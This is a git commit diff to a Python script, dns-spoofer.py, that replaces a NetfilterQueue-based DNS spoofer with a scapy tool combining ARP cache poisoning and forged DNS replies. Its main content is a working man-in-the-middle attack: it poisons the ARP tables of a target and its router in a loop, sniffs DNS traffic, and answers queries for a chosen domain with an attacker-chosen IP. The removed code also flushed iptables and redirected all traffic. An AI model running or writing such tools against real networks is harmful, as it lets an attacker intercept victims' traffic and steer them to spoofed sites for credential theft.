4edf40b45c70f8fa00b8e0f5040bdbdb7dfdef9b
Mick London jr <micklondonjr@proton.me>
2024-09-18 19:17:12 +0700

    Removes netfilterque

--- dns-spoofer.py
+++ dns-spoofer.py
@@ -1,87 +1,84 @@
 #!/usr/bin/env python
 
-import netfilterqueue
-import scapy.all as scapy
+from scapy.all import *
 import argparse
-import logging
-import os
-import sys
+import time
+import threading
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+# Disable verbose output from scapy
+conf.verb = 0
 
-# Function to process each packet in the queue
-def process_packet(packet):
-    try:
-        scapy_packet = scapy.IP(packet.get_payload())
-        # Only process DNS responses
-        if scapy_packet.haslayer(scapy.DNSRR):
-            qname = scapy_packet[scapy.DNSQR].qname.decode()
-            for target_domain, spoofed_ip in target_domains.items():
-                if target_domain in qname:
-                    logging.info(f"[+] Spoofing DNS request for {target_domain}")
-                    # Crafting the spoofed response
-                    answer = scapy.DNSRR(rrname=qname, rdata=spoofed_ip)
-                    scapy_packet[scapy.DNS].an = answer
-                    scapy_packet[scapy.DNS].ancount = 1
+# ARP spoofing part
+def get_mac(ip):
+    # Send ARP request to get the MAC address of the IP
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-                    # Recalculate packet checksums
-                    del scapy_packet[scapy.IP].len
-                    del scapy_packet[scapy.IP].chksum
-                    del scapy_packet[scapy.UDP].len
-                    del scapy_packet[scapy.UDP].chksum
-
-                    # Set modified packet as payload
-                    packet.set_payload(bytes(scapy_packet))
-                    break  # Stop after the first domain match
-
-        packet.accept()
-
-    except Exception as e:
-        logging.error(f"Error processing packet: {e}")
-        packet.accept()
-
-# Function to clean up iptables rules when the script exits
-def clean_up_iptables():
-    logging.info("[*] Flushing iptables rules...")
-    os.system("sudo iptables --flush")
-
-# Function to set up iptables rules
-def setup_iptables(queue_num):
-    logging.info(f"[*] Setting up iptables to redirect DNS traffic to queue {queue_num}")
-    os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
-    os.system(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {queue_num}")
-    os.system(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {queue_num}")
-
-# Command-line arguments parsing
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
-    parser.add_argument("-q", "--queue-num", type=int, default=0, help="NetfilterQueue number")
-    parser.add_argument("-t", "--targets", nargs="+", help="Target domains to spoof in the format domain=IP", required=True)
-    args = parser.parse_args()
-
-    # Parse target domains and IPs
-    target_domains = {}
-    for target in args.targets:
-        domain, ip = target.split("=")
-        target_domains[domain] = ip
-
-    # Setup iptables rules
-    try:
-        setup_iptables(args.queue_num)
-    except Exception as e:
-        logging.error(f"Failed to set up iptables: {e}")
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"[!] Could not find MAC address for IP: {ip}")
         sys.exit(1)
 
-    # Bind the queue and start processing packets
-    try:
-        queue = netfilterqueue.NetfilterQueue()
-        queue.bind(args.queue_num, process_packet)
-        logging.info(f"[*] Running DNS spoofing on queue {args.queue_num}")
-        queue.run()
-    except KeyboardInterrupt:
-        logging.info("\n[!] Detected CTRL+C, quitting...")
+def spoof_arp(target_ip, spoof_ip):
+    # Get the MAC address of the target
+    target_mac = get_mac(target_ip)
+    # Send a malicious ARP response
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
 
-    # Clean up iptables rules on exit
-    finally:
-        clean_up_iptables()
+def restore_arp(target_ip, gateway_ip):
+    # Restore the normal ARP table state after stopping the attack
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    send(packet, count=4, verbose=False)
+
+# DNS spoofing part
+def spoof_dns(pkt, spoofed_ip, target_domain):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname.decode()
+        if target_domain in qname:
+            print(f"[+] Spoofing DNS request for {qname}")
+            # Create the DNS response
+            dns_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                               an=DNSRR(rrname=qname, rdata=spoofed_ip))
+            # Send the spoofed DNS response
+            send(dns_response, verbose=False)
+
+def packet_sniffer(spoofed_ip, target_domain):
+    # Sniff DNS packets and apply the spoof_dns function
+    sniff(filter="udp port 53", prn=lambda pkt: spoof_dns(pkt, spoofed_ip, target_domain))
+
+# Combined attack
+def arp_spoofing_attack(target_ip, gateway_ip):
+    try:
+        while True:
+            # ARP spoof target (make it think we're the router)
+            spoof_arp(target_ip, gateway_ip)
+            # ARP spoof router (make it think we're the target)
+            spoof_arp(gateway_ip, target_ip)
+            time.sleep(2)  # Adjust the sleep time to reduce network traffic
+    except KeyboardInterrupt:
+        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
+        restore_arp(target_ip, gateway_ip)
+        sys.exit(1)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="ARP Spoofing and DNS Spoofing Script")
+    parser.add_argument("-t", "--target-ip", help="Target IP address", required=True)
+    parser.add_argument("-g", "--gateway-ip", help="Gateway IP address (usually the router)", required=True)
+    parser.add_argument("-d", "--domain", help="Domain to spoof", required=True)
+    parser.add_argument("-s", "--spoof-ip", help="IP address to spoof the domain with", required=True)
+    args = parser.parse_args()
+
+    # Run ARP spoofing in a separate thread
+    arp_thread = threading.Thread(target=arp_spoofing_attack, args=(args.target_ip, args.gateway_ip))
+    arp_thread.start()
+
+    # Start DNS spoofing in the main thread
+    packet_sniffer(args.spoof_ip, args.domain)
